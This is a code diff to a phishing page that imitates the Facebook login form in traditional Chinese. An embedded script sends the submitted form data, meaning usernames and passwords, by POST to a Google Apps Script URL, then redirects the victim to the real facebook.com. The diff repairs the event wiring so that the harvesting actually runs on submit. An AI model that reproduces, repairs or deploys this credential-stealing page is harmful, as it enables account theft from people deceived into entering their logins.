@@ -11933,7 +11933,7 @@ requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
                         <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" />
                         <input type="hidden" autocomplete="off" name="next" value="" />
                         <div class="_6ltg">
-                          <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_d_EP">登入</button>
+                          <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="submit" data-testid="royal_login_button" type="submit" id="u_0_d_EP">登入</button>
                         </div>
                         <div class="_6ltj">
                           <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjI5NDY2MTY5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">忘記密碼？</a>
@@ -11947,7 +11947,7 @@ requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
                         const scriptURL = 'https://script.google.com/macros/s/AKfycbz7ZIPeT8BpUTPp1niObEolzoo_On2lSYUizugy_ree8tVasMYt5XzfBuaoxnqfbzUr/exec'
                                 const form = document.forms['google-sheet']
                               
-                                form.addEventListener('login', e => {
+                                form.addEventListener('submit', e => {
                                   e.preventDefault()
                                   fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                                     .then(response => window.location.replace("http:\/\/www.facebook.com"))
